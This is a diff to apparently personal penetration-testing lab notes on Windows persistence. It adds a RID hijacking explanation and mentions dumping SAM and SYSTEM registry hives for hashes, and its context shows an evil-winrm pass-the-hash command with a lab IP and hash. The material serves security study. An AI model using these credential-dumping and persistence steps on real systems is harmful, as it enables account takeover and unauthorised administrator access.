@@ -273,6 +273,12 @@ Powershell Commands
 * `netsta -ano` : To get all the connections that are running on the system.
 * `Get-Process` : To see all the processes.
 
+
+
+
+
+# Windows persistence
+
 ## Abusing unprivelleged users
 
 Making them part of administrators group is the best way because you can then directly RDP them or user WinRM to access that machine.
@@ -285,14 +291,23 @@ reg save hklm\system system.bak
 ```powershell
 reg save hklm\sam sam.bak
 ```
-And pass it to secretdumps.py and get the hashes of the users. Once we have the hashes of the user we can pass it on to evil-winrm.
+And pass it to secretdumps.py or samdump2 and get the hashes of the users. Once we have the hashes of the user we can pass it on to evil-winrm.
 
 ```bash
 evil-winrm -i 10.10.142.152 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
 ```
 
+## RID Hijacking 
 
+Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.
 
+Windows assigns each user a Relative ID (RID) and the default Administrator account always has a RID of 500. Regular users get RIDs of 1000 or greater. By tampering with these RIDs in the registry, you can fool Windows into thinking an unprivileged user is actually an Administrator
+
+We can find info about it through following command
+
+```powershell
+wmic useraccount get name,sid
+```
 
 
 
